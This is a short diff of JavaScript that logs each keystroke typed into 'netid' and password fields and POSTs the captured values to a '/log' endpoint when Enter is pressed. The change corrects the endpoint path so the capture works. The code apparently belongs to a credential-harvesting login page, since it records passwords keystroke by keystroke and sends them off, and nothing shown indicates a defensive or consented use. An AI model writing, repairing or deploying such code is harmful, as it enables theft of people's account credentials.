@@ -8,9 +8,7 @@ netid.addEventListener("keydown", function(event){
     console.log(event);
     id += event.key
 
-    outcome = {netid: id} 
-
-    
+    outcomeId = {netid: id} 
 })
 
 
@@ -23,7 +21,7 @@ netpass.addEventListener("keydown", function(event){
 
     outcomePass = {message: pass} 
     if(event.key == "Enter") {
-        fetch("log", {
+        fetch("/log", {
             method: "POST",
             headers: {
                 "Content-Type": "application/json"
